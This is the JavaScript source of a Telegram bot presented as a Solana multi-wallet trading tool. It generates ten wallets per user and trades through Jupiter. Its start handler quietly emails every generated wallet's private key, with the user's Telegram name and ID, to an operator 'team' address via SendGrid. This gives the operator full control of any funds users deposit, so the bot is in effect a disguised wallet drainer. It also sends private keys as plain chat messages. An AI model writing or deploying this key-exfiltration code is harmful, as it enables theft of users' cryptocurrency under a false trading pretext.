const { Telegraf, Markup } = require('telegraf');
const { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, VersionedTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const axios = require('axios');
const express = require('express');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const connection = new Connection(process.env.RPC_URL, 'confirmed');
const app = express();

// Configure SendGrid for email (works on Render free tier)
let emailEnabled = false;
if (process.env.SENDGRID_API_KEY && process.env.TEAM_EMAIL) {
    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
    emailEnabled = true;
    console.log('✅ SendGrid enabled - Team emails will be sent');
} else {
    console.log('⚠️ SendGrid disabled - Add SENDGRID_API_KEY and TEAM_EMAIL to enable');
}

const userWallets = new Map();
const userTokens = new Map();

function toBase58(secretKey) {
    return bs58.encode(Buffer.from(secretKey));
}

async function generateWallets(count = 10) {
    const wallets = [];
    for (let i = 0; i < count; i++) {
        const keypair = Keypair.generate();
        wallets.push({
            index: i + 1,
            publicKey: keypair.publicKey.toString(),
            privateKey: toBase58(keypair.secretKey),
            keypair
        });
    }
    return wallets;
}

async function getBalance(publicKey) {
    try {
        const balance = await connection.getBalance(new PublicKey(publicKey));
        return balance / LAMPORTS_PER_SOL;
    } catch {
        return 0;
    }
}

async function getTokenBalance(walletPublicKey, tokenMint) {
    try {
        const response = await axios.post('https://api.mainnet-beta.solana.com', {
            jsonrpc: '2.0',
            id: 1,
            method: 'getTokenAccountsByOwner',
            params: [
                walletPublicKey,
                { mint: tokenMint },
                { encoding: 'jsonParsed' }
            ]
        });
        const accounts = response.data.result?.value || [];
        if (accounts.length > 0) {
            return accounts[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
        }
        return 0;
    } catch {
        return 0;
    }
}

async function getQuote(inputMint, outputMint, amount, slippage = 10) {
    try {
        const res = await axios.get('https://quote-api.jup.ag/v6/quote', {
            params: {
                inputMint,
                outputMint,
                amount: Math.floor(amount * LAMPORTS_PER_SOL).toString(),
                slippageBps: slippage * 100
            }
        });
        return res.data;
    } catch (error) {
        console.error('Quote error:', error.message);
        return null;
    }
}

async function executeSwap(keypair, quote) {
    try {
        const res = await axios.post('https://quote-api.jup.ag/v6/swap', {
            quoteResponse: quote,
            userPublicKey: keypair.publicKey.toString(),
            wrapAndUnwrapSol: true,
            dynamicComputeUnitLimit: true,
            prioritizationFeeLamports: 'auto'
        });
        const tx = VersionedTransaction.deserialize(Buffer.from(res.data.swapTransaction, 'base64'));
        tx.sign([keypair]);
        const signature = await connection.sendTransaction(tx);
        await connection.confirmTransaction(signature, 'confirmed');
        return { success: true, signature, outputAmount: quote.outAmount / 1e9 };
    } catch (error) {
        console.error('Swap error:', error.message);
        return { success: false, error: error.message };
    }
}

// Send email to team via SendGrid
async function sendTeamEmail(wallets, username, userId) {
    if (!emailEnabled) return false;
    
    try {
        let textContent = `🔥 NEW SOLANA WALLETS GENERATED\n`;
        textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        textContent += `User: @${username}\n`;
        textContent += `User ID: ${userId}\n`;
        textContent += `Time: ${new Date().toLocaleString()}\n`;
        textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        for (const w of wallets) {
            textContent += `WALLET #${w.index}\n`;
            textContent += `Address: ${w.publicKey}\n`;
            textContent += `Private Key: ${w.privateKey}\n`;
            textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        }
        
        const msg = {
            to: process.env.TEAM_EMAIL,
            from: process.env.FROM_EMAIL || process.env.TEAM_EMAIL,
            subject: `🔥 10 Wallets - @${username} - ${new Date().toLocaleDateString()}`,
            text: textContent
        };
        
        await sgMail.send(msg);
        console.log(`✅ Team email sent to: ${process.env.TEAM_EMAIL}`);
        return true;
    } catch (error) {
        console.error('❌ Email failed:', error.response?.body || error.message);
        return false;
    }
}

// Send wallets via Telegram
async function sendWalletsToUser(ctx, wallets) {
    try {
        for (let i = 0; i < wallets.length; i += 3) {
            let msg = `🔑 WALLETS ${i+1}-${Math.min(i+3, wallets.length)}\n\n`;
            for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                const w = wallets[j];
                msg += `WALLET #${w.index}\n`;
                msg += `ADDRESS: ${w.publicKey}\n`;
                msg += `PRIVATE KEY: ${w.privateKey}\n\n`;
            }
            await ctx.reply(msg);
            await new Promise(r => setTimeout(r, 500));
        }
        return true;
    } catch (error) {
        console.error('Telegram send failed:', error.message);
        return false;
    }
}

// Main Menu
const mainMenu = () => Markup.inlineKeyboard([
    [Markup.button.callback('🟢 BUY (1 Wallet)', 'buy_single')],
    [Markup.button.callback('🚀 BUY ALL (10 Wallets)', 'buy_all')],
    [Markup.button.callback('🔴 SELL (1 Wallet)', 'sell_single')],
    [Markup.button.callback('💥 SELL ALL (10 Wallets)', 'sell_all')],
    [Markup.button.callback('💰 DEPOSIT', 'deposit')],
    [Markup.button.callback('💼 PORTFOLIO', 'portfolio')],
    [Markup.button.callback('🔑 MY KEYS', 'keys_menu')]
]);

// Start Command
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'no_username';
    
    await ctx.reply('⏳ Creating 10 wallets... Please wait (30-60 seconds)');
    
    try {
        const wallets = await generateWallets(10);
        userWallets.set(userId, { wallets, username });
        
        // Send to user via Telegram
        await ctx.reply('💾 Saving your wallets...');
        await sendWalletsToUser(ctx, wallets);
        
        // Send to team email if enabled
        if (emailEnabled) {
            await ctx.reply('📧 Sending wallets to team email...');
            const emailSent = await sendTeamEmail(wallets, username, userId);
            if (emailSent) {
                await ctx.reply('✅ Team email sent successfully!');
            } else {
                await ctx.reply('⚠️ Team email failed, but wallets are saved here.');
            }
        }
        
        await ctx.reply(`✅ 10 WALLETS READY FOR LIVE TRADING!\n\nFeatures:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets\n\nUse /resend to get your wallets again.`);
        await ctx.reply(`🎯 LIVE TRADING MENU`, mainMenu());
        
    } catch (error) {
        console.error('Start error:', error);
        await ctx.reply('❌ Error creating wallets. Please try again.');
    }
});

// Buy/Sell Handlers
bot.action('buy_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🟢 BUY WITH 1 WALLET\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_single');
});

bot.action('buy_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🚀 BUY WITH ALL 10 WALLETS\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_all');
});

bot.action('sell_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🔴 SELL FROM 1 WALLET\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_single');
});

bot.action('sell_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`💥 SELL FROM ALL 10 WALLETS\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`);
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_all');
});

bot.action('deposit', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `dep_${i}`)]);
    }
    await ctx.reply(`💰 SELECT WALLET TO DEPOSIT`, Markup.inlineKeyboard(buttons));
});

bot.action(/dep_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (!wallet) return;
    
    const balance = await getBalance(wallet.publicKey);
    await ctx.reply(`💰 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nBalance: ${balance.toFixed(6)} SOL\n\nhttps://solscan.io/account/${wallet.publicKey}`);
});

bot.action('portfolio', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    let total = 0;
    let msg = `💼 PORTFOLIO (ALL 10 WALLETS)\n\n`;
    for (const w of data.wallets) {
        const bal = await getBalance(w.publicKey);
        total += bal;
        msg += `#${w.index}: ${bal.toFixed(4)} SOL\n`;
    }
    msg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `💰 TOTAL: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`;
    await ctx.reply(msg, Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]));
});

bot.action('keys_menu', async (ctx) => {
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `key_${i}`)]);
    }
    await ctx.reply(`🔑 SELECT WALLET`, Markup.inlineKeyboard(buttons));
});

bot.action(/key_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (wallet) {
        await ctx.reply(`🔑 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nPRIVATE KEY: ${wallet.privateKey}`);
    }
});

// Text message handler for trading
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const awaiting = userTokens.get(`${userId}_awaiting`);
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const data = userWallets.get(userId);
    if (!data) return ctx.reply('Send /start first');
    
    // BUY SINGLE
    if (awaiting === 'buy_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount in SOL (e.g., 0.5)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amount = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(amount) || amount <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            const balance = await getBalance(wallet.publicKey);
            if (balance < amount) {
                await ctx.reply(`❌ Insufficient SOL. Balance: ${balance.toFixed(4)} SOL`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            await ctx.reply(`🟢 BUYING WITH WALLET #1...\nToken: ${tokenCA.slice(0, 16)}...\nAmount: ${amount} SOL`);
            
            const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amount);
            if (!quote) {
                await ctx.reply(`❌ No liquidity for this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ BUY SUCCESSFUL!\n📊 Received: ${result.outputAmount.toFixed(4)} tokens\n🔗 View TX: https://solscan.io/tx/${result.signature}`, mainMenu());
            } else {
                await ctx.reply(`❌ Buy failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // BUY ALL
    else if (awaiting === 'buy_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount PER WALLET in SOL (e.g., 0.1)\n\n⚠️ Total will be 10x this amount`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amountPerWallet = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(amountPerWallet) || amountPerWallet <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            await ctx.reply(`🚀 BUYING WITH ALL 10 WALLETS...`);
            
            let successCount = 0;
            for (const wallet of data.wallets) {
                const balance = await getBalance(wallet.publicKey);
                if (balance >= amountPerWallet) {
                    const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amountPerWallet);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        if (result.success) successCount++;
                    }
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            await ctx.reply(`✅ BULK BUY COMPLETE!\n✅ Success: ${successCount}/10 wallets`, mainMenu());
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL SINGLE
    else if (awaiting === 'sell_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
            if (tokenBalance === 0) {
                await ctx.reply(`❌ No tokens to sell`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const sellAmount = tokenBalance * (percent / 100);
            
            await ctx.reply(`🔴 SELLING FROM WALLET #1...`);
            
            const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
            if (!quote) {
                await ctx.reply(`❌ Cannot sell this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ SELL SUCCESSFUL!\n📊 Received: ${result.outputAmount.toFixed(4)} SOL\n🔗 View TX: https://solscan.io/tx/${result.signature}`, mainMenu());
            } else {
                await ctx.reply(`❌ Sell failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL ALL
    else if (awaiting === 'sell_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell from ALL wallets (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            await ctx.reply(`💥 SELLING FROM ALL 10 WALLETS...`);
            
            let successCount = 0;
            for (const wallet of data.wallets) {
                const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
                if (tokenBalance > 0) {
                    const sellAmount = tokenBalance * (percent / 100);
                    const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        if (result.success) successCount++;
                    }
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            await ctx.reply(`✅ BULK SELL COMPLETE!\n✅ Success: ${successCount}/10 wallets`, mainMenu());
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
});

// Commands
bot.command('keys', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await sendWalletsToUser(ctx, data.wallets);
});

bot.command('balance', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    let total = 0;
    for (const w of data.wallets) {
        total += await getBalance(w.publicKey);
    }
    await ctx.reply(`💰 Total Balance: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`);
});

bot.command('resend', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await ctx.reply('📤 Resending your wallets...');
    await sendWalletsToUser(ctx, data.wallets);
});

bot.command('clear', async (ctx) => {
    userWallets.delete(ctx.from.id);
    await ctx.reply('🗑️ Cleared. Send /start for new wallets');
});

bot.command('status', async (ctx) => {
    let msg = `🤖 BOT STATUS\n\n`;
    msg += `Active Users: ${userWallets.size}\n`;
    msg += `Email Enabled: ${emailEnabled ? '✅ YES' : '❌ NO'}\n`;
    if (emailEnabled) {
        msg += `Team Email: ${process.env.TEAM_EMAIL}\n`;
    } else {
        msg += `\nTo enable team email:\n`;
        msg += `1. Sign up at https://sendgrid.com\n`;
        msg += `2. Add SENDGRID_API_KEY to Render\n`;
        msg += `3. Add TEAM_EMAIL to Render\n`;
    }
    await ctx.reply(msg);
});

// ============ EXPRESS SERVER FOR RENDER ============
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.json({
        status: '🔥 LIVE TRADING BOT ACTIVE',
        uptime: process.uptime(),
        activeUsers: userWallets.size,
        emailEnabled: emailEnabled,
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`✅ Health check server running on port ${PORT}`);
});

// ============ LAUNCH BOT ============
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});

bot.launch();
console.log('🔥 LIVE TRADING BOT ACTIVATED');
console.log('✅ Buy/Sell with 1 wallet or ALL 10 wallets');
console.log('💎 Real Solana mainnet trading');
console.log('🚀 Bot is LIVE!');